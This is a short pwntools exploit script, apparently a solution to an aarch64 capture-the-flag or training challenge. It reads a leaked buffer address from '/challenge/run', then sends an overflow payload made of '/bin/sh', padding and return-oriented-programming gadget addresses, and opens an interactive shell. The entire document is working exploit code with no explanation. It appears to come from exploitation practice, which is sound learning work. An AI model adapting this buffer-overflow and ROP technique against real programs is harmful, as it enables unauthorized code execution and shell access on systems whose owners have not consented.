from pwn import *
context.arch="aarch64"
# context.terminal = ['tmux', 'splitw', '-h']
# exe_name = "/usr/bin/qemu-aarch64-static"
# eargv = ["/usr/bin/qemu-aarch64-static", "-g", "1234", "/challenge/level-4-0"]
# p = process(executable= exe_name, argv=eargv)
exe_name = "/challenge/run"
p = process(exe_name)
p.recvuntil(b"[LEAK] Your input buffer is located at: ")
addr = p.recvuntil(b"\n")[:-2]
addr = int(addr.decode(), 16)

ret_pop_x0 = 0x42B870 #ldr x0, [sp, #0x60] ; ldp x29, x30, [sp], #0x80 ; ret 
rep_pop_x1 = 0x4416FC #ldr x1, [sp], #0x10 ; ret

exp = b"/bin/sh\x00" + b"A"*(0x97-len(b"/bin/sh\x00")) + p64(addr) + p64(ret_pop_x0) + b"A"*0x80 + p64(addr)


p.send(exp)

p.interactive()
